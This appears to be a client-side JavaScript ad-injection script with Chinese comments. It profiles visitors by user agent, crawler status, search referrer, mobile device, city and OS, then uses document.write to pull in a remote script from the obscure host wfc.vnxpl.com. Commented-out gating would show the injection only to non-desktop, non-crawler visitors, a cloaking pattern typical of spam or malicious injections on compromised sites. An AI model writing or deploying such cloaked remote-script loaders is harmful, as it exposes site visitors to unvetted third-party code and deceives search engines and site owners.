// 打印调试信息
function getDebugInfo() {
    console.log('User Agent: ' + navigator.userAgent.toLowerCase()); // 打印用户代理信息
    console.log('is_robot(): ' + isRobot()); // 判断是否是搜索引擎爬虫
    console.log('isReferrerSearch(): ' + isReferrerSearch()); // 判断是否来自搜索引擎的引荐
    console.log('Is Mobile Device: ' + isMobile()); // 判断是否是移动设备
    console.log('In City: ' + isInCity()); // 判断是否在指定城市
    console.log('Current City: ' + returnCitySN.cname); // 获取当前城市
}

// 判断是否是移动设备
function isMobile() {
    const mobileDevices = ['android', 'iphone', 'symbianos', 'ipad', 'ipod', 'windows phone', 'harmonyos'];
    const userAgent = navigator.userAgent.toLowerCase();
    return mobileDevices.some(device => userAgent.includes(device));
}

// 判断是否来自搜索引擎的引荐
function isReferrerSearch(searchArr) {
    if (searchArr === undefined) {
        searchArr = ['sogou', 'soso', 'baidu', 'google', 'youdao', 'yahoo', 'bing', 'sm', 'so', 'biso', 'gougou', 'ifeng', 'ivc', 'sooule', 'niuhu', 'biso', '360'];
    }
    const referrer = document.referrer.toLowerCase();
    return searchArr.some(searchEngine => referrer.includes(searchEngine));
}

// 判断是否是搜索引擎爬虫
function isRobot(robotArr) {
    if (robotArr === undefined) {
        robotArr = ['baiduspider', 'yisouspider', 'sogou', 'yahoo', '360spider', 'sosospider', 'googlebot', 'bingbot', 'bytespider', 'yandexbot', 'yisouspider'];
    }
    const userAgent = navigator.userAgent.toLowerCase();
    return robotArr.some(robot => userAgent.includes(robot));
}

// 判断是否在指定城市
function isInCity(cityArr) {
    if (cityArr === undefined) {
        cityArr = ['北京', '广州'];
    }
    const city = returnCitySN.cname;
    return cityArr.some(cityName => city.includes(cityName));
}

// 操作系统信息
const system = {
    isWindows: false,
    isMac: false,
    isLinux: false
};

const platform = navigator.platform;
system.isWindows = platform.startsWith('Win');
system.isMac = platform.startsWith('Mac');
system.isLinux = platform === 'X11' || platform.startsWith('Linux');

const adPositions = [
    { direction: 'top', weight: 1 },
    { direction: 'bottom', weight: 1 },
    { direction: 'all', weight: 0 }
];

// 获取随机广告位置
function getRandomAdPosition(positions) {
    const totalWeight = positions.reduce((sum, position) => sum + position.weight, 0);
    let randomNum = Math.random() * totalWeight;

    for (const position of positions) {
        randomNum -= position.weight;
        if (randomNum <= 0) {
            return position.direction;
        }
    }
}

const weightedRandomElement = (elements) => {
    const totalWeight = elements.reduce((sum, el) => sum + el.weight, 0);
    let randomNum = Math.random() * totalWeight;

    for (const el of elements) {
        randomNum -= el.weight;
        if (randomNum <= 0) return el;
    }
};

const randomAdPosition = getRandomAdPosition(adPositions);

// 非Windows、非Mac、非Linux系统且非搜索引擎爬虫才执行以下代码
// if (!system.isWindows && !system.isMac && !system.isLinux && !isRobot()) {
    // 顶部广告
    if (randomAdPosition === 'top' || randomAdPosition === 'all') {
        const topnav = document.querySelector('#topnav');
        if (topnav) {
            topnav.style.marginTop = '120px'; // 设置顶部导航栏的上边距
        }

        const temporaryGroups = [{ value: 'dm', weight: 1 }];
        const randomGroup = weightedRandomElement(temporaryGroups).value;

        if (randomGroup === 'dm') {
            console.log('dm')
            document.write("<script id='jgd_1899' src='//wfc.vnxpl.com/sh/1899.js'><\/script>");

        }
    }

    // 底部广告
    if (randomAdPosition === 'bottom' || randomAdPosition === 'all') {
        const temporaryGroup = [{ value: 'ks', weight: 1 }];
        const randomElement = weightedRandomElement(temporaryGroup).value;

        if (randomElement === 'ks') {
            console.log('ks')
        
        }
    }
// }